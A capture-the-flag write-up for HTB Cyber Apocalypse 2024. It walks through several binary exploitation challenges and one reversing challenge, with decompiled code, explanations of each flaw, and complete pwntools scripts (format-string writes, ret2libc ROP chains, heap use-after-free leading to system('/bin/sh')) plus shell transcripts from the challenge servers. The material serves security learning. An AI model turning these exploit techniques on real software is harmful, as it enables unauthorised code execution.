---
title: Cyber Apocalypse 2024 - Hacker Royale
date: '2024-03-14T06:30:00+05:30'
event: Blog Post
category: writeup
difficulty: Intermediate
author:
- VulnX
tags:
- pwn
- reverse engineering
description: Overall a very nice CTF with a good difficulty curve and well made challenges.
  I managed to solve 7/10 pwn and 1 reversing challenge.     pwn/Tutorial...
---
Overall a very nice CTF with a good difficulty curve and well made challenges. I managed to solve 7/10 pwn and 1 reversing challenge.

---

# pwn/Tutorial

> Before we start, practice time!<br>
> Attachment: [pwn_tutorial.zip](https://github.com/ResetSec/HTB-Cyber-Apocalypse-2024/blob/main/pwn/Tutorial/pwn_tutorial.zip)

Just use the given binary to answer the very basic questions regarding integer overflow.

---

# pwn/Delulu

> HALT! Recognition protocol initiated. Please present your face for scanning.<br>
> Attachment: [pwn_delulu.zip](https://github.com/ResetSec/HTB-Cyber-Apocalypse-2024/blob/main/pwn/Delulu/pwn_delulu.zip)

## Analysis

On reversing with ghidra we get the following source:

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  long local_48;
  long *local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0x1337babe;
  local_40 = &local_48;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  read(0,&local_38,0x1f);
  printf("\n[!] Checking.. ");
  printf((char *)&local_38);
  if (local_48 == 0x1337beef) {
    delulu();
  }
  else {
    error("ALERT ALERT ALERT ALERT\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```c
void delulu(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = open("./flag.txt",0);
  if (local_14 < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("You managed to deceive the robot, here\'s your new identity: ");
  while( true ) {
    sVar1 = read(local_14,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Clearly we will get the flag if we call `delulu()`. That can be done if `local_48 == 0x1337beef`, however `local_48` is explicitly defined as `0x1337babe`. So obviously we need to partial overwrite the lower two bytes.

# Vulnerability

We have format string vulnerability in this line of code `printf((char *)&local_38);` . Since `local_38` is our input, we basically control the format specifier part of `printf()`. This gives us arbitrary read/write.

So we can use this to overwrite the lower 2 bytes of `local_48` but it requires us to have a pointer to `local_48` on the stack. Luckily that's done for us:

```c
local_48 = 0x1337babe;
local_40 = &local_48;
```

## Exploit

According to [64-bit calling convention](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame) in linux, the first 6 arguments to any function are passed via registers and the rest are passed via the stack. So the 7th arg (index 6) to printf is the first stack value and the 8th arg (index 7) is the second stack value.

If you attach a debugger and look at the stack before the call to printf, you will see that the stack somewhat looks like that:

```
+----------+
| local_48 | <-- RSP
|----------|
| local_40 |
|----------|
|    ...   |
```

Basically:

- 7th arg [ index 6 ] = local_48

- 8th arg [ index 7 ] = local_40 *(pointer to local_48)*

So we can write to `local_48` by using `local_40`

Here's the solve script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./delulu")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.250.218", 39766)

    return r


def main():
    r = conn()

    # good luck pwning :)
    r.sendline('%{}d%7$hn'.format(0xbeef).encode())
    r.recvuntil(b'{')
    flag = r.recvuntil(b'}')[:-1].decode()
    r.recvuntil('HTB')
    print(f'FLAG: HTB{r.recvline().strip().decode()}\n')


if __name__ == "__main__":
    main()
```

```console
$ python solve.py
[*] '/home/vulnx/Games/CTFs/Cyber Apocalypse/pwn/delulu/challenge/delulu'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
[+] Opening connection to 83.136.250.218 on port 39766: Done
FLAG: HTB{m45t3r_0f_d3c3pt10n}
[*] Closed connection to 83.136.250.218 port 39766
```

## Flag

`HTB{m45t3r_0f_d3c3pt10n}`

---

# pwn/Writing on the wall

> As you approach a password-protected door, a sense of uncertainty envelops you—no clues, no hints. Yet, just as confusion takes hold, your gaze locks onto cryptic markings adorning the nearby wall. Could this be the elusive password, waiting to unveil the door's secrets?<br>
> Attachment: [pwn_writing_on_the_wall.zip](https://github.com/ResetSec/HTB-Cyber-Apocalypse-2024/blob/main/pwn/Writing_on_the_Wall/pwn_writing_on_the_wall.zip)

## Analysis

On reversing with ghidra we get the following source:

```c
undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_1e [6];
  undefined8 local_18;
  long canary;

  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0x2073736170743377;
  read(0,local_1e,7);
  iVar1 = strcmp(local_1e,(char *)&local_18);
  if (iVar1 == 0) {
    open_door();
  }
  else {
    error("You activated the alarm! Troops are coming your way, RUN!\n");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```c
void open_door(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = open("./flag.txt",0);
  if (local_14 < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("You managed to open the door! Here is the password for the next one: ");
  while( true ) {
    sVar1 = read(local_14,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Our task is simple, get `strcmp(local_1e,(char *)&local_18)` to return 0, then we unlock the door and get the flag. `local_1e` is our input and `local_18` is the buffer ( 'w3tpass ' ).

However its not that simple:

```c
read(0,local_1e,7);
```

It only takes 7 bytes from input and compares it with an 8 byte string ( 'w3tpass ' ), so its practically impossible to get the condition true.

# Vulnerability

However if you set a breakpoint at `main+71` and run the binary with GDB and give it `1234567` as the input, you will get this:

```
0x00005555555555a6 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
*RAX  0x7fffffffdafa ◂— '12345673tpass '
 RBX  0x0
 RCX  0x7ffff7d147e2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x7fffffffdb00 ◂— '73tpass '
 RDI  0x0
 RSI  0x7fffffffdafa ◂— '12345673tpass '
 R8   0x5555555592a0 ◂— 0x555555559
 R9   0x7fffffff
 R10  0x7ffff7fc3908 ◂— 0xd00120000000e
 R11  0x246
 R12  0x7fffffffdc28 —▸ 0x7fffffffdf97 ◂— '/home/vulnx/Games/CTFs/Cyber Apocalypse/pwn/Writing on the Wall/challenge/writing_on_the_wall'
 R13  0x55555555555f (main) ◂— endbr64
 R14  0x555555557d48 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555552a0 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x7fffffffdb10 ◂— 0x1
 RSP  0x7fffffffdaf0 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
*RIP  0x5555555555a6 (main+71) ◂— mov rsi, rdx
─────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────
   0x55555555559e <main+63>    lea    rdx, [rbp - 0x10]
   0x5555555555a2 <main+67>    lea    rax, [rbp - 0x16]
 ► 0x5555555555a6 <main+71>    mov    rsi, rdx
   0x5555555555a9 <main+74>    mov    rdi, rax
   0x5555555555ac <main+77>    call   strcmp@plt                <strcmp@plt>

   0x5555555555b1 <main+82>    test   eax, eax
   0x5555555555b3 <main+84>    jne    main+98                <main+98>

   0x5555555555b5 <main+86>    mov    eax, 0
   0x5555555555ba <main+91>    call   open_door                <open_door>

   0x5555555555bf <main+96>    jmp    main+113                <main+113>

   0x5555555555c1 <main+98>    lea    rax, [rip + 0xb98]
──────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────
00:0000│ rsp         0x7fffffffdaf0 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
01:0008│ rax-2 rsi-2 0x7fffffffdaf8 ◂— 'ST12345673tpass '
02:0010│ rdx         0x7fffffffdb00 ◂— '73tpass '
03:0018│-008         0x7fffffffdb08 ◂— 0xc198f41d898a6100
04:0020│ rbp         0x7fffffffdb10 ◂— 0x1
05:0028│+008         0x7fffffffdb18 —▸ 0x7ffff7c29d90 ◂— mov edi, eax
06:0030│+010         0x7fffffffdb20 —▸ 0x7ffff7e1b803 (_IO_2_1_stdout_+131) ◂— 0xe1ca700000000000
07:0038│+018         0x7fffffffdb28 —▸ 0x55555555555f (main) ◂— endbr64
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
```

We have our input in RDX and the source string in RAX. But look closely, the last byte of our input has overflowed to the first byte of source buffer:

```
'w3tpass ' -> '73tpass '
```

This means that, while we cannot make the two strings equal, we can control what the first byte of source string will be.

## Exploit

How about we set it to NULL? That would terminate the source string at length: 0.

If our input also contains the first byte as NULL, then even our string is terminated at length 0.

TL;DR if give it 7 NULL bytes then:

- first byte of our input: \x00

- first byte of source string: \x00

Hence both strings will become equal and we pass the condition check

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./writing_on_the_wall")

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.250.103", 52130)

    return r


def main():
    r = conn()

    # good luck pwning :)

    # gdb.attach(r, gdbscript='''
    #            b * main+71
    #            ''')

    r.send(p64(0))
    r.recvuntil(b'HTB')
    print(f'FLAG: HTB{r.recvline().strip().decode()}')


if __name__ == "__main__":
    main()
```

```console
python solve.py
[*] '/home/vulnx/Games/CTFs/Cyber Apocalypse/pwn/Writing on the Wall/challenge/writing_on_the_wall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
[+] Opening connection to 83.136.250.103 on port 52130: Done
FLAG: HTB{3v3ryth1ng_15_r34d4bl3}
[*] Closed connection to 83.136.250.103 port 52130
```

## Flag

`HTB{3v3ryth1ng_15_r34d4bl3}`

---

# pwn/Pet companion

> Attachment: [pwn_pet_companion.zip](https://github.com/ResetSec/HTB-Cyber-Apocalypse-2024/blob/main/pwn/Pet_Companion/pwn_pet_companion.zip)

## Analysis

On reversing with ghidra we get the following source:

```c
undefined8 main(void)

{
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;

  setup();
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  write(1,"\n[!] Set your pet companion\'s current status: ",0x2e);
  read(0,&local_48,0x100);
  write(1,"\n[*] Configuring...\n\n",0x15);
  return 0;
}
```

# Vulnerability

We have a really obvious buffer overwrite vulnerability here. Our buffer is only 8 * 8 = 64 bytes long whereas we can store 0x100 (256) characters in it.

But the real question is what can we do wit the vuln, let's run checksec and see what attacks are feasible:

```bash
$ checksec pet_companion
[*] '/home/vulnx/Games/CTFs/Cyber Apocalypse/pwn/Pet Companion/challenge/pet_companion'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

- No canary

- No PIE

Seems good. Our buffer is 64 bytes, RBP will be an additional 8 bytes, so the total offset to RIP would be 72. So we can redirect code execution, but where to go to?

Since there is no `win` function for us, we have to rely on the good old ret2system technique ( thankfully we have the libc file )

But the remote server has ASLR enabled which means, to get the exact address of `system()` we will need a libc leak. To get a leak we can use the GOT table via the following ROP chain (gadgets from the binary since PIE is disabled):

- pop rdi ; ret

- 0x1 [ stdout file descriptor ]

- pop rsi ; pop r15 ; ret ( due to unavailability of better gadget )

- GOT['write'] (or any other GOT entry)

- junk value (goes into r15)

- PLT['write'] ( call : write(1, GOT['write'], RDX) )

- exe.sym.main ( restart the program to avoid the crash and get another BoF )

Since RDX is already a high value (can be found via inspecting it in GDB), we don't necessarily need to change it.

After we get the leak we can get libc base via:

```python
libc.address = leak - libc.sym.write
```

and send the following ROP chain for the next BoF:

- pop rdi ; ret

- address to '/bin/sh'

- system()

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pet_companion", checksec=False)
libc = ELF(exe.libc.path, checksec=False)

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.62.244", 46452)

    return r


def main():
    r = conn()

    # good luck pwning :)
    offset = 72
    pop_rdi = 0x0000000000400743
    pop_rsi_r15 = 0x0000000000400741
    payload = flat({
        offset      : p64(pop_rdi),
        offset + 8  : p64(1),
        offset + 16 : p64(pop_rsi_r15),
        offset + 24 : p64(exe.got.write),
        offset + 32 : p64(0),
        offset + 40 : p64(exe.plt.write),
        offset + 48 : p64(exe.sym.main)
        })

    r.clean()
    r.sendline(payload)
    r.recvuntil(b'Configuring...\n\n')
    leak = u64(r.recv(8))
    print(f'{hex(leak)=}')
    libc.address = leak - libc.sym.write
    print(f'{hex(libc.address)=}')

    payload = flat({
        offset      : p64(pop_rdi),
        offset + 8  : p64(next(libc.search(b'/bin/sh\x00'))),
        offset + 16 : p64(libc.sym.system)
        })

    r.sendlineafter(b'status: ', payload)
    r.clean(timeout=1)
    r.interactive()


if __name__ == "__main__":
    main()
```

```bash
$ python solve.py

[+] Opening connection to 94.237.62.244 on port 46452: Done
hex(leak)='0x7f91426740f0'
hex(libc.address)='0x7f9142564000'
[*] Switching to interactive mode
$ id
uid=100(ctf) gid=101(ctf) groups=101(ctf)
$ whoami
ctf
$ ls
core
flag.txt
glibc
pet_companion
$ cat flag.txt
HTB{c0nf1gur3_w3r_d0g}
```

## Flag

`HTB{c0nf1gur3_w3r_d0g}`

---

# pwn/Rocket Blaster XXX

> Prepare for the ultimate showdown! Load your weapons, gear up for battle, and dive into the epic fray—let the fight commence!<br>
> Attachment: [pwn_rocket_blaster_xxx.zip](https://github.com/ResetSec/HTB-Cyber-Apocalypse-2024/blob/main/pwn/Rocket_Blaster_XXX/pwn_rocket_blaster_xxx.zip)

Literally same as `Pet Companion`. Absolutely no change required in solve technique.

## Exploit

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rocket_blaster_xxx")
libc = exe.libc

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.250.140", 58876)

    return r


def main():
    r = conn()

    # good luck pwning :)
    offset = 40
    pop_rdi = 0x000000000040159f
    pop_rsi = 0x000000000040159d
    pop_rdx = 0x000000000040159b
    payload = flat({
        offset       : p64(pop_rdi),
        offset + 8   : p64(exe.got.puts),
        offset + 16  : p64(exe.plt.puts),
        offset + 24  : p64(exe.sym.main)
        })

    r.clean(timeout=2)
    r.sendline(payload)
    r.recvuntil(b'testing..\n')
    leak = u64(r.recvline().strip().ljust(8, b'\x00'))
    print(f'{hex(leak)=}')
    libc.address = leak - libc.sym.puts
    print(f'{hex(libc.address)=}')

    payload = flat({
        offset      : p64(pop_rdi),
        offset + 8  : p64(next(libc.search(b'/bin/sh\x00'))),
        offset + 16 : p64(pop_rdi+1),
        offset + 24 : p64(libc.sym.system)
        })

    r.sendlineafter(b'XX!\n\n>> ', payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

```console
> python solve.py
[+] Opening connection to 83.136.250.140 on port 58876: Done
hex(leak)='0x7b12a1e80e50'
hex(libc.address)='0x7b12a1e00000'
[*] Switching to interactive mode

Preparing beta testing..
$ cat flag.txt
HTB{b00m_b00m_r0ck3t_2_th3_m00n}
```

## Flag
`HTB{b00m_b00m_r0ck3t_2_th3_m00n}`

---

# pwn/Sound of Silence

I lost my writeup for this chall 😭 so you can refer [this](https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/pwn/%5BMedium%5D%20Sound%20of%20Silence)

# pwn/Deathnote
> You stumble upon a mysterious and ancient tome, said to hold the secret to vanquishing your enemies. Legends speak of its magic powers, but cautionary tales warn of the dangers of misuse. <br>
> Attachment: [pwn_deathnote.zip](https://github.com/hackthebox/cyber-apocalypse-2024/blob/main/pwn/%5BMedium%5D%20Death%20Note/release/pwn_deathnote.zip)

## Analysis

On reversing with ghidra we get the following source:

```c
void main(void)

{
  ulong choice;
  long pages [10];
  
  pages[0] = 0;
  pages[1] = 0;
  pages[2] = 0;
  pages[3] = 0;
  pages[4] = 0;
  pages[5] = 0;
  pages[6] = 0;
  pages[7] = 0;
  pages[8] = 0;
  pages[9] = 0;
restart_loop:
  while (choice = menu(), choice == 42) {
    _(pages);
  }
  if (choice < 43) {
    if (choice == 3) {
      show(pages);
      goto restart_loop;
    }
    if (choice < 4) {
      if (choice == 1) {
        add(pages);
      }
      else {
        if (choice != 2) goto invalid;
        delete(pages);
      }
      goto restart_loop;
    }
  }
invalid:
  error("Invalid choice!\n");
  goto restart_loop;
}
```

```c
void delete(long pages)

{
  byte index;
  char is_correct;
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  printf(&DAT_0010268e);
  index = read_num();
  is_correct = check_idx(index);
  if (is_correct == '\x01') {
    if (*(long *)(pages + (ulong)index * 8) == 0) {
      error("Page is already empty!\n");
    }
    else {
      printf("%s\nRemoving page [%d]\n\n%s",&DAT_0010272e,(ulong)index,&DAT_00102008);
    }
                    /* frees the memory irrespective of whether it is already freed or not */
    free(*(void **)(pages + (ulong)index * 8));
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

```c
void _(char **pages)

{
  code *pages[0];
  long in_FS_OFFSET;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("\x1b[1;33m");
  cls();
  printf(&DAT_00102750,&DAT_00102010,&DAT_001026b4,&DAT_00102010,&DAT_001026b4,&DAT_00102008);
  pages[0] = (code *)strtoull(*pages,(char **)0x0,0x10);
  if (((pages[0] == (code *)0x0) && (**pages != '0')) && ((*pages)[1] != 'x')) {
    puts("Error: Invalid hexadecimal string");
  }
  else {
    if ((*pages == (char *)0x0) || (pages[1] == (char *)0x0)) {
      error("What you are trying to do is unacceptable!\n");
                    /* WARNING: Subroutine does not return */
      exit(0x520);
    }
    puts(&DAT_00102848);
    (*pages[0])(pages[1]);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

## Vulnerability

The first vulnerability lies in `delete()` here:

```c
    if (*(long *)(pages + (ulong)index * 8) == 0) {
      error("Page is already empty!\n");
    }
    else {
      printf("%s\nRemoving page [%d]\n\n%s",&DAT_0010272e,(ulong)index,&DAT_00102008);
    }
                    /* frees the memory irrespective of whether it is already freed or not */
    free(*(void **)(pages + (ulong)index * 8));
```

1. Regardless of whether the page is free or not, the program attempts to free it anyway (leading to double free).

2. The heap pointer is not NULL-ed out after freeing leading to Use-After-Free (UAF) vuln.

So we can use the `Show` functionality to leak the chunk metadata.



The second vulnerability is in the `_()` function:

```c
(*pages[0])(pages[1]);
```

This basically allows us to call any function with any argument. So naturally I think of `system('/bin/sh')`

For that, we again need a libc leak.

> NOTE: Program uses *GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.6) stable release version 2.35.* <br>
> So hooks are removed and tcachebin is introduced.

## Exploit

[A libc leak is trivial due to unsorted bin leak](https://drive.google.com/file/d/1eJskblBnGMOM-lKyDKcqVFh8EQG1GB48/view), but the issue is, the max chunk size can be 128 bytes, and on freeing that chunk it will land up either in fastbin (if tcache is full) or in the tcachebin.

The solution is to:

1. Allocate 7 chunks and free them ... to fill tcachebin

2. Allocate two 128 bytes chunks and free them so that they consolidate into a single large chunk which cannot go in the fastbin, thus it lands in unsorted bin.

We can then leak the unsorted bin header and get a libc leak.

From then the plan is straightforward:

- set page[0] = address of system()

- set page[1] = '/bin/sh'

- call `_()`

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./deathnote", checksec=False)
libc = ELF(exe.libc.path, checksec=False)

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.58.148", 38866)

    return r


def main():
    r = conn()

    def add(page, data):
        r.sendline(b'1')
        r.clean(timeout=.5).decode()
        r.sendline(str(128).encode())
        r.clean(timeout=.5).decode()
        r.sendline(str(page).encode())
        r.clean(timeout=.5).decode()
        r.sendline(data)
        r.clean(timeout=.5).decode()

    def delete(page):
        r.sendline(b'2')
        r.clean(timeout=.5).decode()
        r.sendline(str(page).encode())
        r.clean(timeout=.5).decode()

    def leak(page):
        r.sendline(b'3')
        r.clean(timeout=.5).decode()
        r.sendline(str(page).encode())
        r.recvuntil(b'Page content: ')
        leak = r.recvline().strip()
        return leak

    # good luck pwning :)

    # Alloc 7 chunks to fill tcache
    for i in range(7):
        add(i, b'A' * 8)
    # Alloc two more chunks to go in unsorted bin
    add(7, b'A' * 8)
    add(8, b'A' * 8)
    # Alloc another chunk to prevent consolidation between other chunks and top chunk
    add(9, b'A' * 8)

    # Free 7 chunks into tcache
    for i in range(7):
        delete(i)

    delete(7) # Cause consolidation so that
    delete(8) # chunk lands in unsorted bin
    leak = u64(leak(7).ljust(8, b'\x00'))
    log.info('Leak : %s' % hex(leak))
    libc.address = leak - 0x21ace0
    log.success('libc base : %s' % hex(libc.address))

    add(0, hex(libc.sym.system).encode())
    add(1, b'/bin/sh')

    r.sendline(b'42')
    r.clean(timeout=.5)
    r.interactive()


if __name__ == "__main__":
    main()
```

```console
$ python solve.py
[+] Opening connection to 94.237.58.148 on port 38866: Done
[*] Leak : 0x7f26788f8ce0
[+] libc base : 0x7f26786de000
[*] Switching to interactive mode
$ id
uid=100(ctf) gid=101(ctf) groups=101(ctf)
$ whoami
ctf
$ ls
deathnote
flag.txt
glibc
$ cat flag.txt
HTB{0m43_w4_m0u_5h1nd31ru~uWu}
```

## Flag

`HTB{0m43_w4_m0u_5h1nd31ru~uWu}`

# rev/Crushing

> Attachment: [rev_crushing.zip](https://github.com/hackthebox/cyber-apocalypse-2024/blob/main/reversing/%5BEasy%5D%20Crushing/release/rev_crushing.zip)

## Analysis

On reversing with ghidra we get the following source:

```c
undefined8 main(void)

{
  int char;
  long counter1;
  long *pointer_to_buffer;
  long buffer [256];
  long counter2;
  
  pointer_to_buffer = buffer;
  for (counter1 = 255; counter1 != 0; counter1 = counter1 + -1) {
    *pointer_to_buffer = 0;
    pointer_to_buffer = pointer_to_buffer + 1;
  }
  counter2 = 0;
  while( true ) {
    char = getchar();
    if (char == -1) break;
    add_char_to_map(buffer,(char)char,counter2);
    counter2 = counter2 + 1;
  }
  serialize_and_output(buffer);
  return 0;
}
```

```c
void add_char_to_map(long buffer,byte char,long index)

{
  long *malloc_address;
  long buffer[char];
  
  buffer[char] = *(long *)(buffer + (ulong)char * 8);
  malloc_address = (long *)malloc(16);
  *malloc_address = index;
  malloc_address[1] = 0;
  if (buffer[char] == 0) {
    *(long **)((ulong)char * 8 + buffer) = malloc_address;
  }
  else {
    for (; *(long *)(buffer[char] + 8) != 0; buffer[char] = *(long *)(buffer[char] + 8)) {
    }
    *(long **)(buffer[char] + 8) = malloc_address;
  }
  return;
}
```

```c
void serialize_and_output(long buffer)

{
  undefined8 len;
  void **buffer[index];
  void *index;
  int counter;
  
  for (counter = 0; counter < 255; counter = counter + 1) {
    buffer[index] = (void **)(buffer + (long)counter * 8);
    len = list_len(buffer[index]);
    fwrite(&len,8,1,stdout);
    for (index = *buffer[index]; index != (void *)0x0; index = *(void **)((long)index + 8)) {
      fwrite(index,8,1,stdout);
    }
  }
  return;
}
```

The program reads for input via stdin until a -1 (or `EOF`) is received. Then it does some fancy parsing and prints it back. If we compare the a sample output of the program with the `message.txt.cz` file in hex, it becomes obvious that the file contains the output of the program (possibly the flag was given as input). So our task is to understand the output format and attempt to reverse engineer the input given to the program.

We can see that the program starts off by NULLing out a stack array ( 256 `long` elements ). It then calls `add_char_to_map(buffer,(char)char,index);` for every character in our input with its corresponding index.

The `add_char_to_map` function basically prepares 255 linked list where the nth element contains the position where `(char)n` appeared in the input.

Then we `serialize_and_output(buffer)`. That function prints the length of the linked list ( calculated via `list_len()` ) and then iterates over that list and prints out the positions where `(char)index` appeared in the input.

## Exploit

We can start by reading the `message.txt.cz` file in 8 byte chunks and read the frequency of `ith` character in the input and the next subsequent `i` chunks as the indexes of where it appeared. We can create a dictionary containing characters and their respective indexes.

Then we create an empty string and fill it with our dictionary as the right places.

```python
from pwn import *

with open('message.txt.cz', 'rb') as f:
    data = f.read()

chars = {}
i = 0
current_char = 0
while current_char != 0xff:
    number_of_indexes = u64(data[i:i+8])
    i += 8
    for j in range(number_of_indexes):
        index = u64(data[i:i+8])
        i += 8
        if current_char not in chars.keys():
            chars[current_char] = [index]
        else:
            chars[current_char].append(index)
    current_char += 1

length = 0
for char in chars.keys():
    length = max(length, max(chars[char]))

decrypted = [" " for _ in range(length+1)]

for char in chars.keys():
    for index in chars[char]:
        decrypted[index] = chr(char)

print(''.join(char for char in decrypted))
```

```console
$ python solve.py
Organizer 1: Hey, did you finalize the password for the next... you know?

Organizer 2: Yeah, I did. It's "HTB{4_v3ry_b4d_compr3ss1on_sch3m3}"

Organizer 1: "HTB{4_v3ry_b4d_compr3ss1on_sch3m3}," got it. Sounds ominous enough to keep things interesting. Where do we spread the word?

Organizer 2: Let's stick to the usual channels: encrypted messages to the leaders and discreetly slip it into the training manuals for the participants.

Organizer 1: Perfect. And let's make sure it's not leaked this time. Last thing we need is an early bird getting the worm.

Organizer 2: Agreed. We can't afford any slip-ups, especially with the stakes so high. The anticipation leading up to it should be palpable.

Organizer 1: Absolutely. The thrill of the unknown is what keeps them coming back for more. "HTB{4_v3ry_b4d_compr3ss1on_sch3m3}" it is then.
```

It turns out that isn't just the flag but rather a full-fledged conversation 😅

## Flag

`HTB{4_v3ry_b4d_compr3ss1on_sch3m3}`